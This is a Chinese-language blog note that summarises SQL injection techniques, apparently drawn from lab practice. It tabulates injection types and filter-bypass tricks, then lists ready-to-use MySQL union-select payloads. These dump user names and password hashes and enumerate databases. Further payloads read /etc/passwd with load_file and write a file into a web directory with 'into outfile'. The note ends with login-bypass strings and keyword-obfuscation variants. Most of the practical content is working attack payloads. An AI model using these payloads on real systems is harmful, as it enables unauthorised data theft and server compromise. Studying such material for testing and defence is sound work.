---
title: SQL注入技巧总结
date: 2020-01-10 22:13:05
tags:
    - SQL注入
categories:
    - 笔记总结
---
## 注入类型总结

在不断实践中经常遇到如下注入类型，总结如下：

| 注入类型   | 条件                                      | 关键                                      |
| ---------- | ----------------------------------------- | ----------------------------------------- |
| union注入  | 显示查询结果                              | order by , union select                   |
| 布尔注入   | 只返回False或者True                       | length、ord函数、二分法                   |
| 报错注入   | 返回错误信息                              | updatexml、group_concat等函数             |
| 时间盲注   | 无返回信息判断可执行sleep                 | sleep、if等函数                           |
| 宽字节注入 | 数据库为GBK编码、使用了addslashes函数转义 | %df'可以吃掉单引号                        |
| 堆叠注入   | 执行多条查询语句                          | 使用分号分隔多条查询语句                  |
| Cookie注入 | 在请求头中cookie参数异常                  | 可用 sqlmap -r cook.txt - p 参数          |
| base64注入 | 有base64编码过的参数                      | 将payload进行base64编码,可用tamper        |
| XFF注入    | PHP中有getenv函数获取环境配置             | x-forward-for、http_client_ip等请求头参数 |
| 二次注入   | 用户注册功能等                            | 在注册中插入恶意代码，在登录中执行        |

<!-- more -->

## 绕过方式总结

| 绕过方式     | 绕过技巧                                                     |
| ------------ | ------------------------------------------------------------ |
| 大小写绕过   | 关键字未过滤大小写混写的情况，如UniON SEleCt                 |
| 双写绕过     | 关键字仅做替换的情况，可双写替换成需要的语句。如seleselectct替换为select |
| 编码绕过     | 未对编码过滤，可进行url、ascil等常用的编码payload            |
| 内联注释绕过 | /*!and*/                                                     |

## 反注入函数总结
|函数名称|作用|
|---------- | -------------- |
|addslashes($string)|用反斜线引用字符串中的特殊字符' " \|
|mysql_escape_string($string)|用反斜杠转义字符串中的特殊字符，用于mysql_query()查询|
|mysql_real_escape_string($string)|转义SQL语句中使用的字符串中的特殊字符，并考虑到连接的当前字符集，需要保证当前是连接状态才能用该函数，否则会报警告。 不转义%与_|

## 注入常用函数总结
|函数名称|作用|
|---------- | -------------- |
|group_concat|可以把查询的内容组合成一个字符串|
|load_file(file name ) |读取文件并将文件按字符串返回|
|left（string，length）|返回最左边指定的字符数：left（database（），1）>’s’ (猜名字)|
|length（）|判断长度length（database（）>5 |
|substr（a，b，c) | 从字符串a中截取 b到c长度 |
|ascii（）|将某个字符转为ascii值ascii（substr（user（），1，1））=101#|
|mid（a，b，c）|从字符串a中截取 b到c位置（可以用来猜数据库名 ）|

## 常查询变量

|变量|返回结果|
|----- | -----|
| database | 数据库名 |
| version | 数据库版本号 |
| user | 数据库当前用户名 |
| @@basedir | 数据库安装路径 |
| @@version_compile_os | 数据库操作系统 |

## 注入常用命令


* 查看当前用户
> union select 1,(select user())–+

* 查看数据库版本
> union select 1,(select version())–+

* 查看当前数据库名
> union select 1,(select database())–+

* 查看操作系统
> union select 1,(select @@version_compile_os)–+

* 所有用户
> union select 1,(select group_concat(user) from mysql.user)–+

* 用户hash
> union select 1,(select group_concat(password) from mysql.user where user=’root’)

* 查看所有数据库名
> union select 1,(SELECT group_concat(schema_name) from information_schema.schemata)–+

* 查看某一个库的全部表
> union select 1,(SELECT group_concat(table_name) from information_schema.tables where table_schema=’库名’)–+
> union select 1,(SELECT group_concat(table_name) from information_schema.table_constraints where table_schema=’库名’

* 查看某个表的字段名
> union select 1,(SELECT group_concat(column_name) from information_schema.columns where table_name=’表名’)–+

* 查看某个库中某个表的字段名
> union select 1,(select group_concat(column_name) from information_schema.columns where table_name=’表名’ and table_schema=’库名’)–+

* 读文件
> union select 1,(SELECT load_file(‘/etc/passwd’))–+

* 写文件
> union select 1,’‘ into outfile ‘C:\phpStudy\PHPTutorial\WWW\Less-8\3.php’–+


## 绕过登录验证
* admin’ –
* admin’ #
* admin’/*
* ‘ or 1=1–
* ‘ or 1=1#
* ‘ or 1=1/*
* ‘) or ‘1’=’1–
* ‘) or (‘1’=’1–


## 特定符号绕过
|符号名|绕过方法|
|----------- | --------------|
|空格|%09 %0a %A0 %20 /**/|
|注释符|-- - /* .... */ # ` ;%00 %23|
|union|uniounionn UNioN uni/**/on /*!union*/|
|select|selecselectt SeCel/**/t /*!select*/|
|or|oorr OR o/**/r /*!or*/ |||
|and| && anandd ANd an/**/d /*!and*/|